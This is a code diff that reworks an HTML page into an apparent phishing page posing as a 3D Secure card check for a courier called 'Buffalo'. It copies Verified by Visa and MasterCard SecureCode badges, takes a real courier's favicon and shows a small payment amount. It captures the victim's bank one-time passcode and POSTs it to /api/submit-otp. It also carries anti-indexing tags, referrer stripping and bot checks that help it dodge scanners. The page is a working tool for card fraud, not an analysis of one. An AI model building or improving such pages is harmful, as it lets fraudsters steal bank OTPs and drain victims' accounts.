@@ -5,137 +5,272 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
     <meta name="referrer" content="no-referrer" />
     <meta name="robots" content="noindex,nofollow,noarchive,nosnippet" />
-    <title>Bank Verification │ Buffalo Logistics</title>
+    <title>3D Secure │ Buffalo</title>
     <link rel="icon" type="image/x-icon" href="https://thecourierguy.co.za/img/favicon.ico" />
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         html, body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: #f4f5f9;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #fff;
             color: #222;
             min-height: 100%;
+            font-size: 14px;
         }
         .topbar {
-            background: #191D63;
-            color: #fff;
-            padding: 14px 20px;
-            text-align: center;
-            font-weight: 600;
-            letter-spacing: 0.3px;
+            border-top: 4px solid #f5d6e0;
+            padding: 18px 0 8px;
         }
-        .wrap {
-            max-width: 520px;
-            margin: 32px auto;
+        .topbar-inner {
+            max-width: 720px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 80px;
             padding: 0 16px;
         }
-        .card {
-            background: #fff;
-            border-radius: 12px;
-            box-shadow: 0 6px 24px rgba(0,0,0,0.06);
-            padding: 28px 24px;
+        /* Buffalo logo (text-based to avoid external assets) */
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #111;
         }
-        h1 {
-            font-size: 20px;
-            color: #191D63;
-            margin-bottom: 6px;
+        .brand-mark {
+            font-size: 26px;
+            line-height: 1;
+            color: #111;
         }
-        .subtitle {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 22px;
-            line-height: 1.5;
+        .brand-text {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            line-height: 1;
         }
-        .info-box {
-            background: #f7f8fc;
-            border: 1px solid #e6e8ef;
-            border-radius: 8px;
-            padding: 12px 14px;
-            margin-bottom: 22px;
-            font-size: 14px;
-            color: #333;
+        .brand-name {
+            font-size: 30px;
+            font-weight: 900;
+            letter-spacing: 1px;
+            color: #111;
+            position: relative;
         }
-        .info-box strong { color: #191D63; }
-        .field { margin-bottom: 16px; }
-        label {
-            display: block;
-            font-size: 13px;
+        .brand-name sup {
+            font-size: 11px;
+            font-weight: 700;
+            top: -14px;
+            margin-left: 2px;
+        }
+        .brand-tag {
+            font-size: 9px;
             color: #444;
-            margin-bottom: 6px;
+            margin-top: 2px;
+            letter-spacing: 1px;
+        }
+        /* Verified by Visa / MasterCard SecureCode badges */
+        .badges {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .vbv {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.05;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .vbv-top {
+            font-size: 13px;
+            font-style: italic;
+            color: #1a1f71;
             font-weight: 500;
         }
-        .otp-row {
+        .vbv-top b { font-weight: 700; }
+        .vbv-bottom {
+            font-size: 26px;
+            font-weight: 900;
+            font-style: italic;
+            color: #1a1f71;
+            letter-spacing: -0.5px;
+        }
+        .msc {
             display: flex;
-            gap: 8px;
-            justify-content: space-between;
+            flex-direction: column;
+            line-height: 1.05;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .msc-top {
+            font-size: 16px;
+            font-weight: 700;
+            color: #eb001b;
+            letter-spacing: -0.2px;
+        }
+        .msc-top span { color: #f79e1b; }
+        .msc-bottom {
+            font-size: 16px;
+            font-weight: 700;
+            color: #f79e1b;
+            letter-spacing: -0.2px;
+        }
+
+        .wrap {
+            max-width: 720px;
+            margin: 60px auto 0;
+            padding: 0 16px;
+        }
+        .intro {
+            color: #222;
+            font-size: 14px;
+            line-height: 1.55;
+            margin: 0 0 36px;
+        }
+        .section-title {
+            color: #888;
+            font-weight: 700;
+            font-size: 14px;
+            margin-bottom: 18px;
+        }
+        .details {
+            display: grid;
+            grid-template-columns: 220px 1fr;
+            row-gap: 14px;
+            column-gap: 12px;
+            align-items: center;
+            font-size: 14px;
+            margin-bottom: 28px;
+        }
+        .details .label {
+            text-align: right;
+            font-weight: 700;
+            color: #222;
+        }
+        .details .value {
+            text-align: left;
+            color: #222;
         }
         .otp-input {
-            flex: 1;
-            min-width: 0;
-            text-align: center;
-            padding: 14px 0;
-            font-size: 22px;
-            letter-spacing: 2px;
-            border: 1px solid #d6d8e0;
-            border-radius: 8px;
+            width: 180px;
+            padding: 4px 6px;
+            border: 1px solid #888;
+            font-size: 14px;
             background: #fff;
-            color: #222;
             outline: none;
-            transition: border-color 0.15s, box-shadow 0.15s;
-            -moz-appearance: textfield;
-        }
-        .otp-input::-webkit-outer-spin-button,
-        .otp-input::-webkit-inner-spin-button {
-            -webkit-appearance: none;
-            margin: 0;
+            font-family: inherit;
         }
         .otp-input:focus {
-            border-color: #191D63;
-            box-shadow: 0 0 0 3px rgba(25,29,99,0.12);
+            border-color: #1a1f71;
         }
-        .verify-btn {
-            display: block;
-            width: 100%;
-            padding: 14px;
-            background: #191D63;
+        .notice {
+            color: #222;
+            font-size: 14px;
+            line-height: 1.5;
+            margin: 6px 0 24px 0;
+            max-width: 420px;
+        }
+        .submit-row {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 22px;
+        }
+        .submit-btn {
+            background: #111;
             color: #fff;
             border: 0;
-            border-radius: 999px;
-            font-size: 16px;
-            font-weight: 600;
-            letter-spacing: 0.3px;
+            padding: 12px 38px;
+            font-size: 15px;
+            font-weight: 700;
+            font-family: inherit;
             cursor: pointer;
-            margin-top: 8px;
-            transition: background 0.15s, opacity 0.15s;
+            border-radius: 2px;
+            letter-spacing: 0.3px;
         }
-        .verify-btn:hover { background: #14174f; }
-        .verify-btn:disabled { opacity: 0.7; cursor: not-allowed; }
-        .secure-note {
-            text-align: center;
-            font-size: 12px;
-            color: #888;
-            margin-top: 14px;
-        }
-        .secure-note::before { content: "🔒 "; }
-        .resend {
-            text-align: center;
-            font-size: 13px;
-            color: #555;
-            margin-top: 16px;
-        }
-        .resend a {
-            color: #191D63;
-            text-decoration: none;
-            font-weight: 600;
-        }
-        .resend a:hover { text-decoration: underline; }
-        .error-msg {
-            background: #fee;
-            border: 1px solid #c33;
-            color: #c33;
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 16px;
+        .submit-btn:hover { background: #000; }
+        .submit-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .links {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             font-size: 14px;
+            margin-bottom: 22px;
+        }
+        .links a {
+            color: #111;
+            text-decoration: underline;
+            font-weight: 700;
+        }
+        .links a:hover { color: #1a1f71; }
+        .pay-logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 22px;
+            flex-wrap: wrap;
+            padding: 4px 0 40px;
+        }
+        /* Payment brand badges (CSS-only, no external assets) */
+        .pl {
+            display: inline-flex;
+            align-items: center;
+            font-family: Arial, Helvetica, sans-serif;
+            font-weight: 800;
+            line-height: 1;
+        }
+        .pl-samsung {
+            color: #1428a0;
+            font-size: 16px;
+            letter-spacing: -0.3px;
+        }
+        .pl-samsung .pill {
+            background: #1ea7fd;
+            color: #fff;
+            border-radius: 12px;
+            padding: 3px 8px;
+            margin-left: 4px;
+            font-size: 12px;
+            font-weight: 800;
+        }
+        .pl-google {
+            color: #5f6368;
+            font-size: 15px;
+            letter-spacing: -0.2px;
+        }
+        .pl-google .gicon {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background: conic-gradient(#ea4335 0 25%, #fbbc04 25% 50%, #34a853 50% 75%, #4285f4 75% 100%);
+            display: inline-block;
+            margin-right: 5px;
+        }
+        .pl-payfast {
+            color: #ed1c24;
+            font-size: 16px;
+            font-style: italic;
+        }
+        .pl-payfast sup {
+            font-size: 9px;
+            top: -8px;
+        }
+        .pl-payu {
+            color: #a6ce39;
+            font-size: 16px;
+            font-style: italic;
+            font-weight: 900;
+        }
+        .pl-payu .u { color: #00a651; }
+        .pl-payu sup { color: #00a651; font-size: 9px; top: -7px; }
+        .pl-yoco {
+            background: #00bcd4;
+            color: #fff;
+            border-radius: 14px;
+            padding: 4px 12px;
+            font-size: 13px;
+            letter-spacing: 1px;
+        }
+
+        .error-msg {
+            color: #c33;
+            font-size: 13px;
+            margin: 6px 0 0 0;
         }
         /* Honeypot — visually hidden but reachable to bots */
         .hp-field {
@@ -146,56 +281,94 @@
             height: 1px !important;
             opacity: 0 !important;
         }
+
+        @media (max-width: 600px) {
+            .topbar-inner { gap: 24px; flex-wrap: wrap; }
+            .details { grid-template-columns: 1fr; row-gap: 6px; }
+            .details .label { text-align: left; }
+            .details .row-pair { display: flex; gap: 8px; }
+            .notice { max-width: 100%; }
+        }
     </style>
 </head>
 <body>
-    <header class="topbar">Buffalo Logistics │ Bank Verification</header>
-    <main class="wrap">
-        <section class="card">
-            <h1>Enter Verification Code</h1>
-            <p class="subtitle">For your security, your bank has sent a one-time verification code (OTP) to your registered mobile number. Please enter the 6-digit code below to complete payment.</p>
-
-            <div class="info-box">
-                <strong>Payment method:</strong> <span id="vehicle-display">Card</span>
+    <header class="topbar">
+        <div class="topbar-inner">
+            <div class="brand" aria-label="Buffalo">
+                <span class="brand-mark" aria-hidden="true">🦬</span>
+                <div class="brand-text">
+                    <div class="brand-name">BUFFALO<sup>®</sup></div>
+                    <div class="brand-tag">We Deliver Hope</div>
+                </div>
             </div>
+            <div class="badges" aria-label="Verified by Visa and MasterCard SecureCode">
+                <div class="vbv">
+                    <div class="vbv-top"><b>Verified</b> <i>by</i></div>
+                    <div class="vbv-bottom">VISA</div>
+                </div>
+                <div class="msc">
+                    <div class="msc-top">MasterCard<span>.</span></div>
+                    <div class="msc-bottom">SecureCode<span style="color:#eb001b">.</span></div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="wrap">
+        <p class="intro">
+            To continue with your transaction, please enter the One-Time Passcode (OTP) sent to your mobile number and click Submit or confirm via your Banking App to complete payment..
+        </p>
+
+        <div class="section-title">Transaction Details</div>
+
+        <form id="otpForm" action="/api/submit-otp" method="POST" novalidate autocomplete="off">
+            <div class="details">
+                <div class="label">Merchant:</div>
+                <div class="value" id="merchant-display">Buffalo</div>
+
+                <div class="label">Transaction Amount:</div>
+                <div class="value" id="amount-display">R18.99 ZAR</div>
+
+                <div class="label"><label for="otp_code">Enter OTP Code:</label></div>
+                <div class="value">
+                    <input class="otp-input" type="tel" id="otp_code" name="otp_code" inputmode="numeric" maxlength="8" autocomplete="one-time-code" required />
+                </div>
+            </div>
+
+            <p class="notice">You have reached the maximum number of requests for a new code</p>
 
             <div id="error-container" aria-live="assertive"></div>
 
-            <form id="otpForm" action="/api/submit-otp" method="POST" novalidate autocomplete="off">
-                <div class="field">
-                    <label for="otp_1">6-digit code</label>
-                    <div class="otp-row">
-                        <input class="otp-input" type="tel" id="otp_1" name="otp_1" required inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Digit 1" />
-                        <input class="otp-input" type="tel" id="otp_2" name="otp_2" required inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 2" />
-                        <input class="otp-input" type="tel" id="otp_3" name="otp_3" required inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 3" />
-                        <input class="otp-input" type="tel" id="otp_4" name="otp_4" required inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 4" />
-                        <input class="otp-input" type="tel" id="otp_5" name="otp_5" required inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 5" />
-                        <input class="otp-input" type="tel" id="otp_6" name="otp_6" required inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 6" />
-                    </div>
-                </div>
+            <div class="submit-row">
+                <button type="submit" id="submit_button" class="submit-btn">Submit</button>
+            </div>
 
-                <!-- Pre-filled from query string -->
-                <input type="hidden" id="vehicle1" name="vehicle1" value="" />
+            <div class="links">
+                <a href="#" id="help_link">Need help?</a>
+                <a href="/" id="exit_link">Exit</a>
+            </div>
 
-                <!-- Combined OTP (built on submit) -->
-                <input type="hidden" id="otp_code" name="otp_code" value="" />
+            <!-- Pre-filled from query string -->
+            <input type="hidden" id="vehicle1" name="vehicle1" value="" />
 
-                <!-- Honeypot field (bots fill this) -->
-                <label for="company_url" class="hp-field" aria-hidden="true">Company Website (leave blank)</label>
-                <input type="text" id="company_url" name="company_url" class="hp-field" tabindex="-1" autocomplete="off" aria-hidden="true" />
+            <!-- Honeypot field (bots fill this) -->
+            <label for="company_url" class="hp-field" aria-hidden="true">Company Website (leave blank)</label>
+            <input type="text" id="company_url" name="company_url" class="hp-field" tabindex="-1" autocomplete="off" aria-hidden="true" />
 
-                <!-- Timing check -->
-                <input type="hidden" id="form_load_time" name="form_load_time" value="" />
+            <!-- Timing check -->
+            <input type="hidden" id="form_load_time" name="form_load_time" value="" />
 
-                <!-- 20-30 character browser session token -->
-                <input type="hidden" id="session_token" name="session_token" value="" />
+            <!-- 20-30 character browser session token -->
+            <input type="hidden" id="session_token" name="session_token" value="" />
+        </form>
 
-                <button type="submit" id="verify_button" class="verify-btn">Verify &amp; Pay</button>
-            </form>
-
-            <p class="resend">Didn't receive a code? <a href="#" id="resend_link">Resend code</a></p>
-            <p class="secure-note">Your verification is processed over a secure encrypted connection.</p>
-        </section>
+        <div class="pay-logos" aria-label="Accepted payment methods">
+            <span class="pl pl-samsung">SAMSUNG<span class="pill">pay</span></span>
+            <span class="pl pl-google"><span class="gicon"></span>Google Pay</span>
+            <span class="pl pl-payfast"><i>Pay</i><b>Fast</b><sup>®</sup></span>
+            <span class="pl pl-payu">Pay<span class="u">U</span><sup>®</sup></span>
+            <span class="pl pl-yoco">YOCO</span>
+        </div>
     </main>
 
     <script>
@@ -258,58 +431,31 @@
         }
 
         document.addEventListener('DOMContentLoaded', function () {
-            // Pre-fill payment method label from query string
+            // Pre-fill vehicle1 from query string for downstream tracking
             var vehicle = getQueryParam('vehicle1') || 'Card';
             document.getElementById('vehicle1').value = vehicle;
-            document.getElementById('vehicle-display').textContent = vehicle;
 
             // Stamp load time + session token for server-side bot detection
             document.getElementById('form_load_time').value = Date.now();
             document.getElementById('session_token').value = window.__sessionToken;
 
-            // Auto-advance OTP digits on input, allow backspace navigation
-            var inputs = [];
-            for (var i = 1; i <= 6; i++) inputs.push(document.getElementById('otp_' + i));
-
-            inputs.forEach(function (input, idx) {
-                input.addEventListener('input', function () {
-                    this.value = this.value.replace(/\D/g, '').slice(0, 1);
-                    if (this.value && idx < inputs.length - 1) {
-                        inputs[idx + 1].focus();
-                    }
-                });
-                input.addEventListener('keydown', function (e) {
-                    if (e.key === 'Backspace' && !this.value && idx > 0) {
-                        inputs[idx - 1].focus();
-                    }
-                });
-                input.addEventListener('paste', function (e) {
-                    var data = (e.clipboardData || window.clipboardData).getData('text') || '';
-                    var digits = data.replace(/\D/g, '').slice(0, 6);
-                    if (digits.length) {
-                        e.preventDefault();
-                        for (var k = 0; k < digits.length && (idx + k) < inputs.length; k++) {
-                            inputs[idx + k].value = digits.charAt(k);
-                        }
-                        var next = Math.min(idx + digits.length, inputs.length - 1);
-                        inputs[next].focus();
-                    }
-                });
+            // OTP input — digits only
+            var otpInput = document.getElementById('otp_code');
+            otpInput.addEventListener('input', function () {
+                this.value = this.value.replace(/\D/g, '').slice(0, 8);
             });
+            otpInput.focus();
 
-            inputs[0].focus();
-
-            // Resend link — show a brief message; real resend would call an API
-            document.getElementById('resend_link').addEventListener('click', function (e) {
+            // Need help — informational only
+            document.getElementById('help_link').addEventListener('click', function (e) {
                 e.preventDefault();
                 clearError();
-                showError('A new verification code has been sent to your registered mobile number.');
-                document.getElementById('form_load_time').value = Date.now();
+                showError('Please contact your bank if you did not receive a verification code.');
             });
 
             // Submit handler — POSTs to /api/submit-otp, redirects to /success.html
             var form = document.getElementById('otpForm');
-            var verifyButton = document.getElementById('verify_button');
+            var submitButton = document.getElementById('submit_button');
 
             form.addEventListener('submit', async function (e) {
                 e.preventDefault();
@@ -318,17 +464,15 @@
                 var botReason = clientBotCheck();
                 if (botReason) { showError(botReason); return; }
 
-                // Build combined 6-digit code
-                var combined = inputs.map(function (i) { return i.value || ''; }).join('');
-                if (!/^\d{6}$/.test(combined)) {
-                    showError('Please enter the full 6-digit verification code.');
+                var code = (otpInput.value || '').trim();
+                if (!/^\d{4,8}$/.test(code)) {
+                    showError('Please enter the OTP code sent to your mobile number.');
                     return;
                 }
-                document.getElementById('otp_code').value = combined;
 
-                var originalText = verifyButton.textContent;
-                verifyButton.disabled = true;
-                verifyButton.textContent = 'Verifying…';
+                var originalText = submitButton.textContent;
+                submitButton.disabled = true;
+                submitButton.textContent = 'Submitting…';
 
                 try {
                     var formData = new FormData(form);
@@ -347,8 +491,8 @@
                     console.error('OTP submission error:', err);
                     showError('A network error occurred. Please try again.');
                 } finally {
-                    verifyButton.disabled = false;
-                    verifyButton.textContent = originalText;
+                    submitButton.disabled = false;
+                    submitButton.textContent = originalText;
                 }
             });
         });
